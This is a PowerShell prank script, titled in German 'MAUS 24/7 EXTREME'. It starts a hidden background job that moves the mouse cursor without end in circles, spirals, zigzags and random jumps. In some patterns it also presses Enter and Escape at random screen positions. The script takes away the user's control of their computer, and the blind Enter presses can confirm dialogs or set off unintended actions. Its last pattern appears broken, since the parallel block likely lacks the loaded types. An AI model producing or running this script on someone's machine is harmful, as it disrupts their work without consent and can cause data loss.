# ===== MAUS 24/7 EXTREME =====
$mausJob = Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $rand = New-Object System.Random
    
    while ($true) {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        
        # 10 verschiedene Bewegungsmuster
        $muster = $rand.Next(1, 11)
        
        switch ($muster) {
            1 { # Kreis
                for ($w = 0; $w -lt 360; $w += 10) {
                    $x = $screen.Width/2 + 200 * [Math]::Cos($w * [Math]::PI/180)
                    $y = $screen.Height/2 + 200 * [Math]::Sin($w * [Math]::PI/180)
                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
                    Start-Sleep -Milliseconds 10
                }
            }
            2 { # Zickzack
                for ($z = 0; $z -lt $screen.Width; $z += 50) {
                    $y = $screen.Height/2 + 100 * [Math]::Sin($z/50)
                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($z, $y)
                    Start-Sleep -Milliseconds 5
                }
            }
            3 { # Rechteck
                for ($r = 100; $r -lt $screen.Width-100; $r += 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($r, 100); Start-Sleep -Milliseconds 2 }
                for ($r = 100; $r -lt $screen.Height-100; $r += 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($screen.Width-100, $r); Start-Sleep -Milliseconds 2 }
                for ($r = $screen.Width-100; $r -gt 100; $r -= 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($r, $screen.Height-100); Start-Sleep -Milliseconds 2 }
                for ($r = $screen.Height-100; $r -gt 100; $r -= 20) { [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point(100, $r); Start-Sleep -Milliseconds 2 }
            }
            4 { # Spirale
                for ($s = 0; $s -lt 500; $s += 5) {
                    $angle = $s / 20
                    $x = $screen.Width/2 + $s * [Math]::Cos($angle)
                    $y = $screen.Height/2 + $s * [Math]::Sin($angle)
                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
                    Start-Sleep -Milliseconds 1
                }
            }
            5 { # Chaos-Modus
                for ($c = 0; $c -lt 100; $c++) {
                    $x = $rand.Next(0, $screen.Width)
                    $y = $rand.Next(0, $screen.Height)
                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
                    Start-Sleep -Milliseconds 5
                }
            }
            6 { # Sinus-Welle
                for ($s = 0; $s -lt $screen.Width; $s += 10) {
                    $y = $screen.Height/2 + 150 * [Math]::Sin($s/50)
                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($s, $y)
                    Start-Sleep -Milliseconds 3
                }
            }
            7 { # Achterbahn
                for ($a = 0; $a -lt 360; $a += 5) {
                    $x = $screen.Width/2 + 200 * [Math]::Sin($a * [Math]::PI/90)
                    $y = $screen.Height/2 + 150 * [Math]::Sin($a * [Math]::PI/45)
                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
                    Start-Sleep -Milliseconds 2
                }
            }
            8 { # Turbo-Klicks
                for ($t = 0; $t -lt 50; $t++) {
                    $x = $rand.Next(100, $screen.Width-100)
                    $y = $rand.Next(100, $screen.Height-100)
                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
                    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
                    Start-Sleep -Milliseconds 1
                }
            }
            9 { # Maus-Rave
                for ($r = 0; $r -lt 200; $r++) {
                    $x = $rand.Next(0, $screen.Width)
                    $y = $rand.Next(0, $screen.Height)
                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
                    if ($r % 10 -eq 0) { [System.Windows.Forms.SendKeys]::SendWait("{ESC}") }
                    Start-Sleep -Milliseconds 1
                }
            }
            10 { # Boss-Modus - ALLES GLEICHZEITIG
                0..100 | ForEach-Object -Parallel {
                    $x = Get-Random -Minimum 0 -Maximum 1920
                    $y = Get-Random -Minimum 0 -Maximum 1080
                    [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point($x, $y)
                    Start-Sleep -Milliseconds 1
                } -ThrottleLimit 20
            }
        }
        
        Start-Sleep -Milliseconds 100
    }
}

